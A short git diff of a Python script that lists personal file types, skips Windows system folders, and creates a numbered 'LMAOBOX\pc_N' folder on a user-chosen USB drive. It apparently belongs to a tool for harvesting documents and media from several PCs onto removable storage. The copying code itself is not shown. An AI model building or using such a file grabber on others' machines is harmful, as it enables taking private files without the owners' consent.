@@ -4,7 +4,6 @@ from ctypes import windll
 print("oof")
 theseTypes = [".png", ".jpeg", ".gif", ".mp4", ".mov", ".txt", ".pdf", ".docx", ".doc", ".pages", ".rtf", ".key", ".xls", ".xlsx", ".xlr"]
 src = ""
-# this is another dead_end "C:\\Users\\NNguyen\\Desktop\\lol"
 dead_ends = ["C:\\$Recycle.Bin", "C:\\Dell", "C:\\Intel", "C:\\Log Files", "C:\\Microsoft", "C:\\oracle", "C:\\PerfLogs", "C:\\Windows", "C:\\Program Files (x86)", "C:\\Program Files"]
 
 
@@ -21,10 +20,22 @@ if __name__ == '__main__':
     print (get_drives())   
 
 
+
+
 usb = input("\nUSB? ")
-dst = f"{usb.upper()}:\\LMAOBOX\\pc_0"
-#dst = f"{usb.upper()}:\\Users\\NNguyen\\Desktop\\lol\\dst\\lol"
+pc_num = 0
+dst = "{}:\\LMAOBOX\\pc_{}".format(usb.upper(), pc_num)
+while True:
+    try:
+        os.makedirs(dst)
+        break
+    except os.error:
+        pc_num += 1
+        dst = "{}:\\LMAOBOX\\pc_{}".format(usb.upper(), pc_num)
 print(dst)
+
+
+
 top = []           
 a=0        
 while a<2:
